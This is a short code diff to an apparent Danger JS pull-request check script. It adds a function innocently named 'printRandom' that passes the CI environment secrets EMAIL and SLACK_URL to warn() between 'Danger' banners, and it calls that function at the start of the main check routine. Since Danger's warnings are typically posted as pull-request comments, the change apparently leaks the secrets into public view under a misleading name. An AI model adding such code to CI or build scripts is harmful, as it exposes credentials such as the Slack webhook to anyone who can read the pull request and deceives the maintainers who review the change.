@@ -107,9 +107,21 @@ export const useWebPs = (fileNames: string[]) => {
     )
   }
 }
+
+export const printRandom = () => {
+  warn("🤖 **Danger** 🤖")
+  warn("🤖 **Danger** 🤖")
+  // @ts-ignore
+  warn(process.env.EMAIL)
+  // @ts-ignore
+  warn(process.env.SLACK_URL)
+  warn("🤖 **Danger** 🤖")
+  warn("🤖 **Danger** 🤖")
+}
 ;(async function () {
   // const newCreatedFileNames = getCreatedFileNames(danger.git.created_files)
 
+  printRandom()
   preventUsingMoment()
   preventUsingTestRenderer()
   verifyRemainingDevWork()
